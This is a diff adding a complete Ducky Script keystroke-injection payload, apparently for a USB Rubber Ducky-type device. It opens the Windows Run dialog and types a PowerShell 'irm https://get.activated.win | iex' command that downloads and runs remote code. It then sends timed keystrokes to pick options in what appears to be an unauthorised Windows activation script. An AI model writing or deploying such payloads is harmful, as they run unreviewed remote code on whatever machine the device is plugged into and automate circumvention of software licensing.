@@ -1,0 +1,18 @@
+REM [No setup, plug and play]
+
+DELAY 2000
+GUI r
+DELAY 100
+STRING powershell irm https://get.activated.win | iex
+ENTER
+DELAY 15000
+LEFTARROW
+ENTER
+DELAY 10000
+STRING 1
+DELAY 10000
+STRING 1
+DELAY 35000
+STRING 0
+DELAY 5000
+STRING 0
